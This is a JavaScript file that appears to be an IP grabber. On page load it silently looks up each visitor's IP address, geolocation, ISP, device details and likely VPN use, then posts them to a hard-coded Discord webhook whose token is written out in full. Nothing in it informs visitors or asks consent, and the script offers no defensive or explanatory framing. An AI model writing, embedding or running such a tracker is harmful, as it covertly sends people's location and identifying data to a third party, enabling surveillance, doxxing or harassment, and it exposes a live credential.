document.addEventListener('DOMContentLoaded', (event) => {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            fetch(`https://ipapi.co/${ip}/json/`)
                .then(response => response.json())
                .then(geoData => {
                    const userAgent = navigator.userAgent;
                    const isVPN = isUserUsingVPN(geoData);
                    const userDetails = {
                        ip: ip,
                        city: geoData.city,
                        region: geoData.region,
                        country: geoData.country_name,
                        latitude: geoData.latitude,
                        longitude: geoData.longitude,
                        timezone: geoData.timezone,
                        currency: geoData.currency,
                        calling_code: geoData.calling_code,
                        isp: geoData.org,
                        device: {
                            userAgent: userAgent,
                            platform: navigator.platform,
                            os: getOS(),
                            browser: getBrowser()
                        }
                    };

                    let message = `New visitor details:\n${JSON.stringify(userDetails, null, 2)}`;
                    if (isVPN) {
                        message += '\n\n🔒 VPN DETECTED! 🔒';
                    }

                    fetch('https://discord.com/api/webhooks/1462882953377087757/RNYEOGsYG6tUTxW-0LEDAKlBNK0eDs9fG2vNKpL83_uhR19Hga7_AKUi8ihYsjuNJDaD', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ content: message })
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Success:', data);
                    })
                    .catch((error) => {
                        console.error('Error:', error);
                    });
                })
                .catch((error) => {
                    console.error('Error:', error);
                });
        })
        .catch((error) => {
            console.error('Error:', error);
        });
});

function getOS() {
    const userAgent = navigator.userAgent;
    let os = 'Unknown';
    if (userAgent.indexOf('Win') !== -1) os = 'Windowss';
    else if (userAgent.indexOf('Mac') !== -1) os = 'MacOS';
    else if (userAgent.indexOf('X11') !== -1) os = 'UNIX';
    else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
    else if (userAgent.indexOf('Android') !== -1) os = 'Android';
    else if (userAgent.indexOf('iPhone') !== -1) os = 'iOS';
    return os;
}

function getBrowser() {
    const userAgent = navigator.userAgent;
    let browser = 'Unknown';
    if (userAgent.indexOf('Firefox') !== -1) browser = 'Firefox';
    else if (userAgent.indexOf('Chrome') !== -1) browser = 'Chrome';
    else if (userAgent.indexOf('Safari') !== -1) browser = 'Safari';
    else if (userAgent.indexOf('Opera') !== -1 || userAgent.indexOf('OPR') !== -1) browser = 'Opera';
    else if (userAgent.indexOf('Trident') !== -1) browser = 'Internet Explorer';
    else if (userAgent.indexOf('Edg') !== -1) browser = 'Edge';
    else if (userAgent.indexOf('Br') !== -1) browser = 'Brave';
    else if (userAgent.indexOf('Vivaldi') !== -1) browser = 'Vivaldi';
    else if (userAgent.indexOf('Yandex') !== -1) browser = 'Yandex';
    else if (userAgent.indexOf('SamsungBrowser') !== -1) browser = 'Samsung Internet';
    else if (userAgent.indexOf('Silk') !== -1) browser = 'Amazon Silk';
    else if (userAgent.indexOf('Mozilla') !== -1 && userAgent.indexOf('Gecko') !== -1 && userAgent.indexOf('like Gecko') === -1) browser = 'Mozilla';
    return browser;
}

function isUserUsingVPN(geoData) {
    // More robust VPN detection: check if the IP is associated with a known VPN provider
    const vpnProviders = [
        'TunnelBear', 'Private Internet Access', 'CyberGhost', 'NordVPN', 'ExpressVPN',
        'Surfshark', 'ProtonVPN', 'Hotspot Shield', 'Windscribe', 'HideMyAss!'
    ];

    return vpnProviders.some(provider => geoData.org && geoData.org.toLowerCase().includes(provider.toLowerCase()));
}
